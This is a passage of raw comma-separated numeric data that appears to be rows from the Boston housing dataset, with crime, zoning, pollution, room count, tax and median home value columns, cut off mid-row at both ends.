\r\n0.77299,0,8.14,0,0.538,6.495,94.4,4.4547,4,307,21,387.94,12.8,18.4\r\n1.00245,0,8.14,0,0.538,6.674,87.3,4.239,4,307,21,380.23,11.98,21\r\n1.13081,0,8.14,0,0.538,5.713,94.1,4.233,4,307,21,360.17,22.6,12.7\r\n1.35472,0,8.14,0,0.538,6.072,100,4.175,4,307,21,376.73,13.04,14.5\r\n1.38799,0,8.14,0,0.538,5.95,82,3.99,4,307,21,232.6,27.71,13.2\r\n1.15172,0,8.14,0,0.538,5.701,95,3.7872,4,307,21,358.77,18.35,13.1\r\n1.61282,0,8.14,0,0.538,6.096,96.9,3.7598,4,307,21,248.31,20.34,13.5\r\n0.06417,0,5.96,0,0.499,5.933,68.2,3.3603,5,279,19.2,396.9,9.68,18.9\r\n0.09744,0,5.96,0,0.499,5.841,61.4,3.3779,5,279,19.2,377.56,11.41,20\r\n0.08014,0,5.96,0,0.499,5.85,41.5,3.9342,5,279,19.2,396.9,8.77,21\r\n0.17505,0,5.96,0,0.499,5.966,30.2,3.8473,5,279,19.2,393.43,10.13,24.7\r\n0.02763,75,2.95,0,0.428,6.595,21.8,5.4011,3,252,18.3,395.63,4.32,30.8\r\n0.03359,75,2.95,0,0.428,7.024,15.8,5.4011,3,252,18.3,395.62,1.98,34.9\r\n0.12744,0,6.91,0,0.448,6.77,2.9,5.7209,3,233,17.9,385.41,4.84,26.6\r\n0.1415,0,6.91,0,0.448,6.169,6.6,5.7209,3,233,17.9,383.37,5.81,25.3\r\n0.15936,0,6.91,0,0.448,6.211,6.5,5.7209,3,233,17.9,394.46,7.44,24.7\r\n0.12269,0,6.91,0,0.448,6.069,40,5.7209,3,233,17.9,389.39,9.55,21.2\r\n0.17142,0,6.91,0,0.448,5.682,33.8,5.1004,3,233,17.9,396.9,10.21,19.3\r\n0.18836,0,6.91,0,0.448,5.786,33.3,5.1004,3,233,17.9,396.9,14.15,20\r\n0.22927,0,6.91,0,0.448,6.03,85.5,5.6894,3,233,17.9,392.74,18.8,16.6\r\n0.25387,0,6.91,0,0.448,5.399,95.3,5.87,3,233,17.9,396.9,30.81,14.4\r\n0.21977,0,6.91,0,0.448,5.602,62,6.0877,3,233,17.9,396.9,16.2,19.4\r\n0.08873,21,5.64,0,0.439,5.963,45.7,6.8147,4,243,16.8,395.56,13.45,19.7\r\n0.04337,21,5.64,0,0.439,6.115,63,6.8147,4,243,16.8,393.97,9.43,20.5\r\n0.0536,21,5.64,0,0.439,6.511,21.1,6.8147,4,243,16.8,396.9,5.28,25\r\n0.04981,21,5.64,0,0.439,5.998,21.4,6.8147,4,243,16.8,396.9,8.43,23.4\r\n0.0136,75,4,0,0.41,5.888,47.6,7.3197,3,469,21.1,396.9,14.8,18.9\r\n0.01311,90,1.22,0,0.403,7.249,21.9,8.6966,5,226,17.9,395.93,4.81,35.4\r\n0.02055,85,0.74,0,0.41,6.383,35.7,9.1876,2,313,17.3,396.9,5.77,24.7\r\n0.01432,100,1.32,0,0.411,6.816,40.5,8.3248,5,256,15.1,392.9,3.95,31.6\r\n0.15445,25,5.13,0,0.453,6.145,29.2,7.8148,8,284,19.7,390.68,6.86,23.3\r\n0.10328,25,5.13,0,0.453,5.927,47.2,6.932,8,284,19.7,396.9,9.22,19.6\r\n0.14932,25,5.13,0,0.453,5.741,66.2,7.2254,8,284,19.7,395.11,13.15,18.7\r\n0.17171,25,5.13,0,0.453,5.966,93.4,6.8185,8,284,19.7,378.08,14.44,16\r\n0.11027,25,5.13,0,0.453,6.456,67.8,7.2255,8,284,19.7,396.9,6.73,22.2\r\n0.1265,25,5.13,0,0.453,6.762,43.4,7.9809,8,284,19.7,395.58,9.5,25\r\n0.01951,17.5,1.38,0,0.4161,7.104,59.5,9.2229,3,216,18.6,393.24,8.05,33\r\n0.03584,80,3.37,0,0.398,6.29,17.8,6.6115,4,337,16.1,396.9,4.67,23.5\r\n0.04379,80,3.37,0,0.398,5.787,31.1,6.6115,4,337,16.1,396.9,10.24,19.4\r\n0.05789,12.5,6.07,0,0.409,5.878,21.4,6.498,4,345,18.9,396.21,8.1,22\r\n0.13554,12.5,6.07,0,0.409,5.594,36.8,6.498,4,345,18.9,396.9,13.09,17.4\r\n0.12816,12.5,6.07,0,0.409,5.885,33,6.498,4,345,18.9,396.9,8.79,20.9\r\n0.08826,0,10.81,0,0.413,6.417,6.6,5.2873,4,305,19.2,383.73,6.72,24.2\r\n0.15876,0,10.81,0,0.413,5.961,17.5,5.2873,4,305,19.2,376.94,9.88,21.7\r\n0.09164,0,10.81,0,0.413,6.065,7.8,5.2873,4,305,19.2,390.91,5.52,22.8\r\n0.19539,0,10.81,0,0.413,6.245,6.2,5.2873,4,305,19.2,377.17,7.54,23.4\r\n0.07896,0,12.83,0,0.437,6.273,6,4.2515,5,398,18.7,394.92,6.78,24.1\r\n0.09512,0,12.83,0,0.437,6.286,45,4.5026,5,398,18.7,383.23,8.94,21.4\r\n0.10153,0,12.83,0,0.437,6.279,74.5,4.0522,5,398,18.7,373.66,11.97,20\r\n0.08707,0,12.83,0,0.437,6.14,45.8,4.0905,5,398,18.7,386.96,10.27,20.8\r\n0.05646,0,12.83,0,0.437,6.232,53.7,5.0141,5,398,18.7,386.4,12.34,21.2\r\n0.08387,0,12.83,0,0.437,5.874,36.6,4.5026,5,398,18.7,396.06,9.1,20.3\r\n0.04113,25,4.86,0,0.426,6.727,33.5,5.4007,4,281,19,396.9,5.29,28\r\n0.04462,25,4.86,0,0.426,6.619,70.4,5.4007,4,281,19,395.63,7.22,23.9\r\n0.03659,25,4.86,0,0.426,6.302,32.2,5.4007,4,281,19,396.9,6.72,24.8\r\n0.03551,25,4.86,0,0.426,6.167,46.7,5.4007,4,281,19,390.64,7.51,22.9\r\n0.05059,0,4.49,0,0.449,6.389,48,4.7794,3,247,18.5,396.9,9.62,23.9\r\n0.05735,0,4.49,0,0.449,6.63,56.1,4.4377,3,247,18.5,392.3,6.53,26.6\r\n0.05188,0,4.49,0,0.449,6.015,45.1,4.4272,3,247,18.5,395.99,12.86,22.5\r\n0.07151,0,4.49,0,0.449,6.121,56.8,3.7476,3,247,18.5,395.15,8.44,22.2\r\n0.0566,0,3.41,0,0.489,7.007,86.3,3.4217,2,270,17.8,396.9,5.5,23.6\r\n0.05302,0,3.41,0,0.489,7.079,63.1,3.4145,2,270,17.8,396.06,5.7,28.7\r\n0.04684,0,3.41,0,0.489,6.417,66.1,3.0923,2,270,17.8,392.18,8.81,22.6\r\n0.03932,0,3.41,0,0.489,6.405,73.9,3.0921,2,270,17.8,393.55,8.2,22\r\n0.04203,28,15.04,0,0.464,6.442,53.6,3.6659,4,270,18.2,395.01,8.16,22.9\r\n0.02875,28,15.04,0,0.464,6.211,28.9,3.6659,4,270,18.2,396.33,6.21,25\r\n0.04294,28,15.04,0,0.464,6.249,77.3,3.615,4,270,18.2,396.9,10.59,20.6\r\n0.12204,0,2.89,0,0.445,6.625,57.8,3.4952,2,276,18,357.98,6.65,28.4\r\n0.11504,0,2.89,0,0.445,6.163,69.6,3.4952,2,276,18,391.83,11.34,21.4\r\n0.12083,0,2.89,0,0.445,8.069,76,3.4952,2,276,18,396.9,4.21,38.7\r\n0.08187,0,2.89,0,0.445,7.82,36.9,3.4952,2,276,18,393.53,3.57,43.8\r\n0.0686,0,2.89,0,0.445,7.416,62.5,3.4952,2,276,18,396.9,6.19,33.2\r\n0.14866,0,8.56,0,0.52,6.727,79.9,2.7778,5,384,20.9,394.76,9.42,27.5\r\n0.11432,0,8.56,0,0.52,6.781,71.3,2.8561,5,384,20.9,395.58,7.67,26.5\r\n0.22876,0,8.56,0,0.52,6.405,85.4,2.7147,5,384,20.9,70.8,10.63,18.6\r\n0.21161,0,8.56,0,0.52,6.137,87.4,2.7147,5,384,20.9,394.47,13.44,19.3\r\n0.1396,0,8.56,0,0.52,6.167,90,2.421,5,384,20.9,392.69,12.33,20.1\r\n0.13262,0,8.56,0,0.52,5.851,96.7,2.1069,5,384,20.9,394.05,16.47,19.5\r\n0.1712,0,8.56,0,0.52,5.836,91.9,2.211,5,384,20.9,395.67,18.66,19.5\r\n0.13117,0,8.56,0,0.52,6.127,85.2,2.1224,5,384,20.9,387.69,14.09,20.4\r\n0.12802,0,8.56,0,0.52,6.474,97.1,2.4329,5,384,20.9,395.24,12.27,19.8\r\n0.26363,0,8.56,0,0.52,6.229,91.2,2.5451,5,384,20.9,391.23,15.55,19.4\r\n0.10793,0,8.56,0,0.52,6.195,54.4,2.7778,5,384,20.9,393.49,13,21.7\r\n0.10084,0,10.01,0,0.547,6.715,81.6,2.6775,6,432,17.8,395.59,10.16,22.8\r\n0.12329,0,10.01,0,0.547,5.913,92.9,2.3534,6,432,17.8,394.95,16.21,18.8\r\n0.22212,0,10.01,0,0.547,6.092,95.4,2.548,6,432,17.8,396.9,17.09,18.7\r\n0.14231,0,10.01,0,0.547,6.254,84.2,2.2565,6,432,17.8,388.74,10.45,18.5\r\n0.17134,0,10.01,0,0.547,5.928,88.2,2.4631,6,432,17.8,344.91,15.76,18.3\r\n0.13158,0,10.01,0,0.547,6.176,72.5,2.7301,6,432,17.8,393.3,12.04,21.2\r\n0.15098,0,10.01,0,0.547,6.021,82.6,2.7474,6,432,17.8,394.51,10.3,19.2\r\n0.13058,0,10.01,0,0.547,5.872,73.1,2.4775,6,432,17.8,338.63,15.37,20.4\r\n0.14476,0,10.01,0,0.547,5.731,65.2,2.7592,6,432,17.8,391.5,13.61,19.3\r\n0.06899,0,25.65,0,0.581,5.87,69.7,2.2577,2,188,19.1,389.15,14.37,22\r\n0.07165,0,25.65,0,0.581,6.004,84.1,2.1974,2,188,19.1,377.67,14.27,20.3\r\n0.09299,0,25.65,0,0.581,5.961,92.9,2.0869,2,188,19.1,378.09,17.93,20.5\r\n0.15038,0,25.65,0,0.581,5.856,97,1.9444,2,188,19.1,370.31,25.41,17.3\r\n0.09849,0,25.65,0,0.581,5.879,95.8,2.0063,2,188,19.1,379.38,17.58,18.8\r\n0.16902,0,25.65,0,0.581,5.986,88.4,1.9929,2,188,19.1,385.02,14.81,21.4\r\n0.38735,0,25.65,0,0.581,5.613,95.6,1.7572,2,188,19.1,359.29,27.26,15.7\r\n0.25915,0,21.89,0,0.624,5.693,96,1.7883,4,437,21.2,392.11,17.19,16.2\r\n0.32543,0,21.89,0,0.624,6.431,98.8,1.8125,4,437,21.2,396.9,15.39,18\r\n0.88125,0,21.89,0,0.624,5.637,94.7,1.9799,4,437,21.2,396.9,18.34,14.3\r\n0.34006,0,21.89,0,0.624,6.458,98.9,2.1185,4,437,21.2,395.04,12.6,19.2\r\n1.19294,0,21.89,0,0.624,6.326,97.7,2.271,4,437,21.2,396.9,12.26,19.6\r\n0.59005,0,21.89,0,0.624,6.372,97.9,2.3274,4,437,21.2,385.76,11.12,23\r\n0.32982,0,21.89,0,0.624,5.822,95.4,2.4699,4,437,21.2,388.69,15.03,18.4\r\n0.97617,0,21.89,0,0.624,5.757,98.4,2.346,4,437,21.2,262.76,17.31,15.6\r\n0.55778,0,21.89,0,0.624,6.335,98.2,2.1107,4,437,21.2,394.67,16.96,18.1\r\n0.32264,0,21.89,0,0.624,5.942,93.5,1.9669,4,437,21.2,378.25,16.9,17.4\r\n0.35233,0,21.89,0,0.624,6.454,98.4,1.8498,4,437,21.2,394.08,14.59,17.1\r\n0.2498,0,21.89,0,0.624,5.857,98.2,1.6686,4,437,21.2,392.04,21.32,13.3\r\n0.54452,0,21.89,0,0.624,6.151,97.9,1.6687,4,437,21.2,396.9,18.46,17.8\r\n0.2909,0,21.89,0,0.624,6.174,93.6,1.6119,4,437,21.2,388.08,24.16,14\r\n1.62864,0,21.89,0,0.624,5.019,100,1.4394,4,437,21.2,396.9,34.41,14.4\r\n3.32105,0,19.58,1,0.871,5.403,100,1.3216,5,403,14.7,396.9,26.82,13.4\r\n4.0974,0,19.58,0,0.871,5.468,100,1.4118,5,403,14.7,396.9,26.42,15.6\r\n2.77974,0,19.58,0,0.871,4.903,97.8,1.3459,5,403,14.7,396.9,29.29,11.8\r\n2.37934,0,19.58,0,0.871,6.13,100,1.4191,5,403,14.7,172.91,27.8,13.8\r\n2.15505,0,19.58,0,0.871,5.628,100,1.5166,5,403,14.7,169.27,16.65,15.6\r\n2.36862,0,19.58,0,0.871,4.926,95.7,1.4608,5,403,14.7,391.71,29.53,14.6\r\n2.33099,0,19.58,0,0.871,5.186,93.8,1.5296,5,403,14.7,356.99,28.32,17.8\r\n2.73397,0,19.58,0,0.871,5.597,94.9,1.5257,5,403,14.7,351.85,21.45,15.4\r\n1.6566,0,19.58,0,0.871,6.122,97.3,1.618,5,403,14.7,372.8,14.1,21.5\r\n1.49632,0,19.58,0,0.871,5.404,100,1.5916,5,403,14.7,341.6,13.28,19.6\r\n1.12658,0,19.58,1,0.871,5.012,88,1.6102,5,403,14.7,343.28,12.12,15.3\r\n2.14918,0,19.58,0,0.871,5.709,98.5,1.6232,5,403,14.7,261.95,15.79,19.4\r\n1.41385,0,19.58,1,0.871,6.129,96,1.7494,5,403,14.7,321.02,15.12,17\r\n3.53501,0,19.58,1,0.871,6.152,82.6,1.7455,5,403,14.7,88.01,15.02,15.6\r\n2.44668,0,19.58,0,0.871,5.272,94,1.7364,5,403,14.7,88.63,16.14,13.1\r\n1.22358,0,19.58,0,0.605,6.943,97.4,1.8773,5,403,14.7,363.43,4.59,41.3\r\n1.34284,0,19.58,0,0.605,6.066,100,1.7573,5,403,14.7,353.89,6.43,24.3\r\n1.42502,0,19.58,0,0.871,6.51,100,1.7659,5,403,14.7,364.31,7.39,23.3\r\n1.27346,0,19.58,1,0.605,6.25,92.6,1.7984,5,403,14.7,338.92,5.5,27\r\n1.46336,0,19.58,0,0.605,7.489,90.8,1.9709,5,403,14.7,374.43,1.73,50\r\n1.83377,0,19.58,1,0.605,7.802,98.2,2.0407,5,403,14.7,389.61,1.92,50\r\n1.51902,0,19.58,1,0.605,8.375,93.9,2.162,5,403,14.7,388.45,3.32,50\r\n2.24236,0,19.58,0,0.605,5.854,91.8,2.422,5,403,14.7,395.11,11.64,22.7\r\n2.924,0,19.58,0,0.605,6.101,93,2.2834,5,403,14.7,240.16,9.81,25\r\n2.01019,0,19.58,0,0.605,7.929,96.2,2.0459,5,403,14.7,369.3,3.7,50\r\n1.80028,0,19.58,0,0.605,5.877,79.2,2.4259,5,403,14.7,227.61,12.14,23.8\r\n2.3004,0,19.58,0,0.605,6.319,96.1,2.1,5,403,14.7,297.09,11.1,23.8\r\n2.44953,0,19.58,0,0.605,6.402,95.2,2.2625,5,403,14.7,330.04,11.32,22.3\r\n1.20742,0,19.58,0,0.605,5.875,94.6,2.4259,5,403,14.7,292.29,14.43,17.4\r\n2.3139,0,19.58,0,0.605,5.88,97.3,2.3887,5,403,14.7,348.13,12.03,19.1\r\n0.13914,0,4.05,0,0.51,5.572,88.5,2.5961,5,296,16.6,396.9,14.69,23.1\r\n0.09178,0,4.05,0,0.51,6.416,84.1,2.6463,5,296,16.6,395.5,9.04,23.6\r\n0.08447,0,4.05,0,0.51,5.859,68.7,2.7019,5,296,16.6,393.23,9.64,22.6\r\n0.06664,0,4.05,0,0.51,6.546,33.1,3.1323,5,296,16.6,390.96,5.33,29.4\r\n0.07022,0,4.05,0,0.51,6.02,47.2,3.5549,5,296,16.6,393.23,10.11,23.2\r\n0.05425,0,4.05,0,0.51,6.315,73.4,3.3175,5,296,16.6,395.6,6.29,24.6\r\n0.06642,0,4.05,0,0.51,6.86,74.4,2.9153,5,296,16.6,391.27,6.92,29.9\r\n0.0578,0,2.46,0,0.488,6.98,58.4,2.829,3,193,17.8,396.9,5.04,37.2\r\n0.06588,0,2.46,0,0.488,7.765,83.3,2.741,3,193,17.8,395.56,7.56,39.8\r\n0.06888,0,2.46,0,0.488,6.144,62.2,2.5979,3,193,17.8,396.9,9.45,36.2\r\n0.09103,0,2.46,0,0.488,7.155,92.2,2.7006,3,193,17.8,394.12,4.82,37.9\r\n0.10008,0,2.46,0,0.488,6.563,95.6,2.847,3,193,17.8,396.9,5.68,32.5\r\n0.08308,0,2.46,0,0.488,5.604,89.8,2.9879,3,193,17.8,391,13.98,26.4\r\n0.06047,0,2.46,0,0.488,6.153,68.8,3.2797,3,193,17.8,387.11,13.15,29.6\r\n0.05602,0,2.46,0,0.488,7.831,53.6,3.1992,3,193,17.8,392.63,4.45,50\r\n0.07875,45,3.44,0,0.437,6.782,41.1,3.7886,5,398,15.2,393.87,6.68,32\r\n0.12579,45,3.44,0,0.437,6.556,29.1,4.5667,5,398,15.2,382.84,4.56,29.8\r\n0.0837,45,3.44,0,0.437,7.185,38.9,4.5667,5,398,15.2,396.9,5.39,34.9\r\n0.09068,45,3.44,0,0.437,6.951,21.5,6.4798,5,398,15.2,377.68,5.1,37\r\n0.06911,45,3.44,0,0.437,6.739,30.8,6.4798,5,398,15.2,389.71,4.69,30.5\r\n0.08664,45,3.44,0,0.437,7.178,26.3,6.4798,5,398,15.2,390.49,2.87,36.4\r\n0.02187,60,2.93,0,0.401,6.8,9.9,6.2196,1,265,15.6,393.37,5.03,31.1\r\n0.01439,60,2.93,0,0.401,6.604,18.8,6.2196,1,265,15.6,376.7,4.38,29.1\r\n0.01381,80,0.46,0,0.422,7.875,32,5.6484,4,255,14.4,394.23,2.97,50\r\n0.04011,80,1.52,0,0.404,7.287,34.1,7.309,2,329,12.6,396.9,4.08,33.3\r\n0.04666,80,1.52,0,0.404,7.107,36.6,7.309,2,329,12.6,354.31,8.61,30.3\r\n0.03768,80,1.52,0,0.404,7.274,38.3,7.309,2,329,12.6,392.2,6.62,34.6\r\n0.0315,95,1.47,0,0.403,6.975,15.3,7.6534,3,402,17,396.9,4.56,34.9\r\n0.01778,95,1.47,0,0.403,7.135,13.9,7.6534,3,402,17,384.3,4.45,32.9\r\n0.03445,82.5,2.03,0,0.415,6.162,38.4,6.27,2,348,14.7,393.77,7.43,24.1\r\n0.02177,82.5,2.03,0,0.415,7.61,15.7,6.27,2,348,14.7,395.38,3.11,42.3\r\n0.0351,95,2.68,0,0.4161,7.853,33.2,5.118,4,224,14.7,392.78,3.81,48.5\r\n0.02009,95,2.68,0,0.4161,8.034,31.9,5.118,4,224,14.7,390.55,2.88,50\r\n0.13642,0,10.59,0,0.489,5.891,22.3,3.9454,4,277,18.6,396.9,10.87,22.6\r\n0.22969,0,10.59,0,0.489,6.326,52.5,4.3549,4,277,18.6,394.87,10.97,24.4\r\n0.25199,0,10.59,0,0.489,5.783,72.7,4.3549,4,277,18.6,389.43,18.06,22.5\r\n0.13587,0,10.59,1,0.489,6.064,59.1,4.2392,4,277,18.6,381.32,14.66,24.4\r\n0.43571,0,10.59,1,0.489,5.344,100,3.875,4,277,18.6,396.9,23.09,20\r\n0.17446,0,10.59,1,0.489,5.96,92.1,3.8771,4,277,18.6,393.25,17.27,21.7\r\n0.37578,0,10.59,1,0.489,5.404,88.6,3.665,4,277,18.6,395.24,23.98,19.3\r\n0.21719,0,10.59,1,0.489,5.807,53.8,3.6526,4,277,18.6,390.94,16.03,22.4\r\n0.14052,0,10.59,0,0.489,6.375,32.3,3.9454,4,277,18.6,385.81,9.38,28.1\r\n0.28955,0,10.59,0,0.489,5.412,9.8,3.5875,4,277,18.6,348.93,29.55,23.7\r\n0.19802,0,10.59,0,0.489,6.182,42.4,3.9454,4,277,18.6,393.63,9.47,25\r\n0.0456,0,13.89,1,0.55,5.888,56,3.1121,5,276,16.4,392.8,13.51,23.3\r\n0.07013,0,13.89,0,0.55,6.642,85.1,3.4211,5,276,16.4,392.78,9.69,28.7\r\n0.11069,0,13.89,1,0.55,5.951,93.8,2.8893,5,276,16.4,396.9,17.92,21.5\r\n0.11425,0,13.89,1,0.55,6.373,92.4,3.3633,5,276,16.4,393.74,10.5,23\r\n0.35809,0,6.2,1,0.507,6.951,88.5,2.8617,8,307,17.4,391.7,9.71,26.7\r\n0.40771,0,6.2,1,0.507,6.164,91.3,3.048,8,307,17.4,395.24,21.46,21.7\r\n0.62356,0,6.2,1,0.507,6.879,77.7,3.2721,8,307,17.4,390.39,9.93,27.5\r\n0.6147,0,6.2,0,0.507,6.618,80.8,3.2721,8,307,17.4,396.9,7.6,30.1\r\n0.31533,0,6.2,0,0.504,8.266,78.3,2.8944,8,307,17.4,385.05,4.14,44.8\r\n0.52693,0,6.2,0,0.504,8.725,83,2.8944,8,307,17.4,382,4.63,50\r\n0.38214,0,6.2,0,0.504,8.04,86.5,3.2157,8,307,17.4,387.38,3.13,37.6\r\n0.41238,0,6.2,0,0.504,7.163,79.9,3.2157,8,307,17.4,372.08,6.36,31.6\r\n0.29819,0,6.2,0,0.504,7.686,17,3.3751,8,307,17.4,377.51,3.92,46.7\r\n0.44178,0,6.2,0,0.504,6.552,21.4,3.3751,8,307,17.4,380.34,3.76,31.5\r\n0.537,0,6.2,0,0.504,5.981,68.1,3.6715,8,307,17.4,378.35,11.65,24.3\r\n0.46296,0,6.2,0,0.504,7.412,76.9,3.6715,8,307,17.4,376.14,5.25,31.7\r\n0.57529,0,6.2,0,0.507,8.337,73.3,3.8384,8,307,17.4,385.91,2.47,41.7\r\n0.33147,0,6.2,0,0.507,8.247,70.4,3.6519,8,307,17.4,378.95,3.95,48.3\r\n0.44791,0,6.2,1,0.507,6.726,66.5,3.6519,8,307,17.4,360.2,8.05,29\r\n0.33045,0,6.2,0,0.507,6.086,61.5,3.6519,8,307,17.4,376.75,10.88,24\r\n0.52058,0,6.2,1,0.507,6.631,76.5,4.148,8,307,17.4,388.45,9.54,25.1\r\n0.51183,0,6.2,0,0.507,7.358,71.6,4.148,8,307,17.4,390.07,4.73,31.5\r\n0.08244,30,4.93,0,0.428,6.481,18.5,6.1899,6,300,16.6,379.41,6.36,23.7\r\n0.09252,30,4.93,0,0.428,6.606,42.2,6.1899,6,300,16.6,383.78,7.37,23.3\r\n0.11329,30,4.93,0,0.428,6.897,54.3,6.3361,6,300,16.6,391.25,11.38,22\r\n0.10612,30,4.93,0,0.428,6.095,65.1,6.3361,6,300,16.6,394.62,12.4,20.1\r\n0.1029,30,4.93,0,0.428,6.358,52.9,7.0355,6,300,16.6,372.75,11.22,22.2\r\n0.12757,30,4.93,0,0.428,6.393,7.8,7.0355,6,300,16.6,374.71,5.19,23.7\r\n0.20608,22,5.86,0,0.431,5.593,76.5,7.9549,7,330,19.1,372.49,12.5,17.6\r\n0.19133,22,5.86,0,0.431,5.605,70.2,7.9549,7,330,19.1,389.13,18.46,18.5\r\n0.33983,22,5.86,0,0.431,6.108,34.9,8.0555,7,330,19.1,390.18,9.16,24.3\r\n0.19657,22,5.86,0,0.431,6.226,79.2,8.0555,7,330,19.1,376.14,10.15,20.5\r\n0.16439,22,5.86,0,0.431,6.433,49.1,7.8265,7,330,19.1,374.71,9.52,24.5\r\n0.19073,22,5.86,0,0.431,6.718,17.5,7.8265,7,330,19.1,393.74,6.56,26.2\r\n0.1403,22,5.86,0,0.431,6.487,13,7.3967,7,330,19.1,396.28,5.9,24.4\r\n0.21409,22,5.86,0,0.431,6.438,8.9,7.3967,7,330,19.1,377.07,3.59,24.8\r\n0.08221,22,5.86,0,0.431,6.957,6.8,8.9067,7,330,19.1,386.09,3.53,29.6\r\n0.36894,22,5.86,0,0.431,8.259,8.4,8.9067,7,330,19.1,396.9,3.54,42.8\r\n0.04819,80,3.64,0,0.392,6.108,32,9.2203,1,315,16.4,392.89,6.57,21.9\r\n0.03548,80,3.64,0,0.392,5.876,19.1,9.2203,1,315,16.4,395.18,9.25,20.9\r\n0.01538,90,3.75,0,0.394,7.454,34.2,6.3361,3,244,15.9,386.34,3.11,44\r\n0.61154,20,3.97,0,0.647,8.704,86.9,1.801,5,264,13,389.7,5.12,50\r\n0.66351,20,3.97,0,0.647,7.333,100,1.8946,5,264,13,383.29,7.79,36\r\n0.65665,20,3.97,0,0.647,6.842,100,2.0107,5,264,13,391.93,6.9,30.1\r\n0.54011,20,3.97,0,0.647,7.203,81.8,2.1121,5,264,13,392.8,9.59,33.8\r\n0.53412,20,3.97,0,0.647,7.52,89.4,2.1398,5,264,13,388.37,7.26,43.1\r\n0.52014,20,3.97,0,0.647,8.398,91.5,2.2885,5,264,13,386.86,5.91,48.8\r\n0.82526,20,3.97,0,0.647,7.327,94.5,2.0788,5,264,13,393.42,11.25,31\r\n0.55007,20,3.97,0,0.647,7.206,91.6,1.9301,5,264,13,387.89,8.1,36.5\r\n0.76162,20,3.97,0,0.647,5.56,62.8,1.9865,5,264,13,392.4,10.45,22.8\r\n0.7857,20,3.97,0,0.647,7.014,84.6,2.1329,5,264,13,384.07,14.79,30.7\r\n0.57834,20,3.97,0,0.575,8.297,67,2.4216,5,264,13,384.54,7.44,50\r\n0.5405,20,3.97,0,0.575,7.47,52.6,2.872,5,264,13,390.3,3.16,43.5\r\n0.09065,20,6.96,1,0.464,5.92,61.5,3.9175,3,223,18.6,391.34,13.65,20.7\r\n0.29916,20,6.96,0,0.464,5.856,42.1,4.429,3,223,18.6,388.65,13,21.1\r\n0.16211,20,6.96,0,0.464,6.24,16.3,4.429,3,223,18.6,396.9,6.59,25.2\r\n0.1146,20,6.96,0,0.464,6.538,58.7,3.9175,3,223,18.6,394.96,7.73,24.4\r\n0.22188,20,6.96,1,0.464,7.691,51.8,4.3665,3,223,18.6,390.77,6.58,35.2\r\n0.05644,40,6.41,1,0.447,6.758,32.9,4.0776,4,254,17.6,396.9,3.53,32.4\r\n0.09604,40,6.41,0,0.447,6.854,42.8,4.2673,4,254,17.6,396.9,2.98,32\r\n0.10469,40,6.41,1,0.447,7.267,49,4.7872,4,254,17.6,389.25,6.05,33.2\r\n0.06127,40,6.41,1,0.447,6.826,27.6,4.8628,4,254,17.6,393.45,4.16,33.1\r\n0.07978,40,6.41,0,0.447,6.482,32.1,4.1403,4,254,17.6,396.9,7.19,29.1\r\n0.21038,20,3.33,0,0.4429,6.812,32.2,4.1007,5,216,14.9,396.9,4.85,35.1\r\n0.03578,20,3.33,0,0.4429,7.82,64.5,4.6947,5,216,14.9,387.31,3.76,45.4\r\n0.03705,20,3.33,0,0.4429,6.968,37.2,5.2447,5,216,14.9,392.23,4.59,35.4\r\n0.06129,20,3.33,1,0.4429,7.645,49.7,5.2119,5,216,14.9,377.07,3.01,46\r\n0.01501,90,1.21,1,0.401,7.923,24.8,5.885,1,198,13.6,395.52,3.16,50\r\n0.00906,90,2.97,0,0.4,7.088,20.8,7.3073,1,285,15.3,394.72,7.85,32.2\r\n0.01096,55,2.25,0,0.389,6.453,31.9,7.3073,1,300,15.3,394.72,8.23,22\r\n0.01965,80,1.76,0,0.385,6.23,31.5,9.0892,1,241,18.2,341.6,12.93,20.1\r\n0.03871,52.5,5.32,0,0.405,6.209,31.3,7.3172,6,293,16.6,396.9,7.14,23.2\r\n0.0459,52.5,5.32,0,0.405,6.315,45.6,7.3172,6,293,16.6,396.9,7.6,22.3\r\n0.04297,52.5,5.32,0,0.405,6.565,22.9,7.3172,6,293,16.6,371.72,9.51,24.8\r\n0.03502,80,4.95,0,0.411,6.861,27.9,5.1167,4,245,19.2,396.9,3.33,28.5\r\n0.07886,80,4.95,0,0.411,7.148,27.7,5.1167,4,245,19.2,396.9,3.56,37.3\r\n0.03615,80,4.95,0,0.411,6.63,23.4,5.1167,4,245,19.2,396.9,4.7,27.9\r\n0.08265,0,13.92,0,0.437,6.127,18.4,5.5027,4,289,16,396.9,8.58,23.9\r\n0.08199,0,13.92,0,0.437,6.009,42.3,5.5027,4,289,16,396.9,10.4,21.7\r\n0.12932,0,13.92,0,0.437,6.678,31.1,5.9604,4,289,16,396.9,6.27,28.6\r\n0.05372,0,13.92,0,0.437,6.549,51,5.9604,4,289,16,392.85,7.39,27.1\r\n0.14103,0,13.92,0,0.437,5.79,58,6.32,4,289,16,396.9,15.84,20.3\r\n0.06466,70,2.24,0,0.4,6.345,20.1,7.8278,5,358,14.8,368.24,4.97,22.5\r\n0.05561,70,2.24,0,0.4,7.041,10,7.8278,5,358,14.8,371.58,4.74,29\r\n0.04417,70,2.24,0,0.4,6.871,47.4,7.8278,5,358,14.8,390.86,6.07,24.8\r\n0.03537,34,6.09,0,0.433,6.59,40.4,5.4917,7,329,16.1,395.75,9.5,22\r\n0.09266,34,6.09,0,0.433,6.495,18.4,5.4917,7,329,16.1,383.61,8.67,26.4\r\n0.1,34,6.09,0,0.433,6.982,17.7,5.4917,7,329,16.1,390.43,4.86,33.1\r\n0.05515,33,2.18,0,0.472,7.236,41.1,4.022,7,222,18.4,393.68,6.93,36.1\r\n0.05479,33,2.18,0,0.472,6.616,58.1,3.37,7,222,18.4,393.36,8.93,28.4\r\n0.07503,33,2.18,0,0.472,7.42,71.9,3.0992,7,222,18.4,396.9,6.47,33.4\r\n0.04932,33,2.18,0,0.472,6.849,70.3,3.1827,7,222,18.4,396.9,7.53,28.2\r\n0.49298,0,9.9,0,0.544,6.635,82.5,3.3175,4,304,18.4,396.9,4.54,22.8\r\n0.3494,0,9.9,0,0.544,5.972,76.7,3.1025,4,304,18.4,396.24,9.97,20.3\r\n2.63548,0,9.9,0,0.544,4.973,37.8,2.5194,4,304,18.4,350.45,12.64,16.1\r\n0.79041,0,9.9,0,0.544,6.122,52.8,2.6403,4,304,18.4,396.9,5.98,22.1\r\n0.26169,0,9.9,0,0.544,6.023,90.4,2.834,4,304,18.4,396.3,11.72,19.4\r\n0.26938,0,9.9,0,0.544,6.266,82.8,3.2628,4,304,18.4,393.39,7.9,21.6\r\n0.3692,0,9.9,0,0.544,6.567,87.3,3.6023,4,304,18.4,395.69,9.28,23.8\r\n0.25356,0,9.9,0,0.544,5.705,77.7,3.945,4,304,18.4,396.42,11.5,16.2\r\n0.31827,0,9